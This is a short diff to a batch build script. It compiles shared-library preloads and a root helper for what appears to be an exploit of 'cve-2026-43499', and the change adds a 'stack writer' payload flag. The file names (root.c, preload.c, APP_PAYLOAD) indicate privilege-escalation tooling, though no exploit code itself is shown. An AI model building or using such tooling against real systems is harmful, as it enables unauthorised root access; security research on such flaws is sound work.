@@ -9,8 +9,8 @@ echo === Building preload (root-umh) ===
 call %CC% -fPIC -O2 -g0 -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare -Isrc %TH% src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/preload.c -shared -pthread -o %OUTDIR%/cve-2026-43499
 if errorlevel 1 (echo PRELOAD BUILD FAILED & exit /b 1)
 
-echo === Building app preload ===
-call %CC% -DAPP_PAYLOAD=1 -fPIC -O2 -g0 -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare -Isrc %TH% src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c -shared -pthread -o %OUTDIR%/cve-2026-43499-app.so
+echo === Building app preload (MCAST stack writer) ===
+call %CC% -DAPP_PAYLOAD=1 -DSLIDE_STACK_WRITER=1 -fPIC -O2 -g0 -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare -Isrc %TH% src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c -shared -pthread -o %OUTDIR%/cve-2026-43499-app.so
 if errorlevel 1 (echo APP BUILD FAILED & exit /b 1)
 
 echo === Building root helper ===
